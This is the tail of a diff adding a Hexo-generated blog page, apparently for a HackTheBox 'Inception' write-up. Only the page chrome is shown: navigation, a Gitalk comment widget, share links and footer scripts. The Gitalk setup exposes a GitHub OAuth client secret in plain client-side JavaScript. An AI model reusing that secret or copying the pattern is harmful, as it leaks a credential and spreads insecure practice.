+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/04/09/Control-HackTheBox/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Control - HackTheBox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/03/12/Help-HackTheBox/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Help - HackTheBox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2021</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/03/13/Inception-HackTheBox/&title=《Inception - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/03/13/Inception-HackTheBox/&title=《Inception - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/03/13/Inception-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Inception - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/03/13/Inception-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/03/13/Inception-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLklEQVR42u3azW6EMAxF4Xn/l6bbVhXhXBtGIj5ZoU6BfCws/+Tzwev4tf7//ex6/Su56+YlQ4aM1zKO5ar9D/kQd71XhgwZcxhnL15f8/BKwuj6ORd7liFDhgyQ9vHgWEscZciQIaMWcC/SNRCgeekrQ4YMGaSY7JSj6b0P1uIyZMh4IYN33b9//ch8Q4YMGa9iHOEiCV9tSJmWxH+eI0OGjK0ZPMCRlDEta9Ni+OLwhwwZMsYweICrbTRtt5HgLkOGjAmMWkGbtr1qrTQS3GXIkDGBwcMiHy7y0Bkkf+tBpgwZMkYy+IEMniamjIAnQ4aMTRkknHXStc5xMVIMy5AhYw6Dp32dzXUOWFzsU4YMGQMY663cG0BrH+XiyTJkyNiakb7yrhW30ngxLEOGjE0Z5IbagS3ejCPhNW66yZAhYwsGHzGmWwmaZXi0ebpbGTJkjGfwg6edAecNmaYMGTI2ZfAGPU8fa82y9F4ZMmRMY6SDxv4he/454iGrDBkyNmXwBllarPLmPj98doqRIUPGAEaatHFA2ugvNulkyJAxgJEeISUrTQTTFFOGDBkTGLVt8RZbp6HGk0UZMmTszUjng2mhW2v0p40/GTJkTGDwIMu/SjoKTY9oFL+0DBkyXs5ID2GQYrXTkuMfXYYMGTLSBI73+Xhj7vGAK0OGjO0YaQus/xwU7mXIkDGAwYcBnfQxLVmDcCxDhoytGZ28qzO2rAXc1iBThgwZ72P8AJHAdHJDXjF1AAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
